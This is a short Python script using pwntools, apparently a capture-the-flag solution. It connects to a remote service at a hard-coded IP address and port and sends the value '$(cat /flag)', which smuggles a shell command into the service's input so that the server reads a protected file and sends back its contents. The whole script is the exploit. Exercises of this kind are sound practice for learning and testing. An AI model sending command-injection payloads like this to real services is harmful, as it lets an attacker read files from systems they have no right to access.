from pwn import *

r = remote('129.204.78.34', 20448)
r.sendline(b'$(cat /flag)')

print(r.recvline())
